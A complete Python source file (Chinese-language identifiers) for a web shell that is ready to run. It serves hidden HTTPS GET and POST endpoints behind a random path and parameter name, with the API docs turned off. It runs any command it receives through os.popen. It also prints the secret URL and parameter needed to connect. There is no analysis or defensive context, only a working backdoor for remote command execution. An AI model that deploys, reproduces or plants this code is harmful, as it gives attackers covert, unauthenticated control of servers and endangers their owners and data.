
私钥路径 = "./cert/private.key"
证书路径 = "./cert/certificate.crt"
端口 = 222

if __name__ == "__main__":
    import os
    from fastapi import FastAPI, Form, Request, HTTPException
    from fastapi.responses import HTMLResponse,JSONResponse
    import uvicorn
    import string
    import random
    from fastapi.exceptions import RequestValidationError
    from ast import literal_eval

    class Config(object):
        @staticmethod
        def getDocs():
            def generate_random_string(length):return ''.join(random.choice(string.ascii_letters) for _ in range(length))
            if not os.path.exists('./webshell.cfg'):
                with open('./webshell.cfg', 'w') as f:
                    f.write(str({
                        "PATH": "/" + generate_random_string(64),
                        "QUERY": "query_" + generate_random_string(24)
                    }))
            with open('./webshell.cfg', 'r') as f:
                data = f.read()
            return literal_eval(data)

        @staticmethod
        def getPATH():
            return Config.getDocs()["PATH"]
        
        @staticmethod
        def getQUERY():
            return Config.getDocs()["QUERY"]

    PATH = Config.getPATH()
    QUERY = Config.getQUERY()

    app = FastAPI(docs_url=None, redoc_url=None)

    def handler(command: str):
        print(command)
        result = os.popen(command).read()
        return result
    
    exec(f'''
@app.get("{PATH}", response_class=HTMLResponse, include_in_schema=False)
async def shell_get({QUERY}: str = ""):
    return handler({QUERY})
        
@app.post("{PATH}", response_class=HTMLResponse, include_in_schema=False)
async def shell_post({QUERY}: str = Form(...)):
    return handler({QUERY})
    ''')

    print(f'''
--------------------

连接路径: https://{"{你的IP}"}:{端口}{PATH}

连接密码(参数): {QUERY}

--------------------
    ''')
    uvicorn.run(app, host='0.0.0.0', port=端口, ssl_keyfile=私钥路径, ssl_certfile=证书路径)

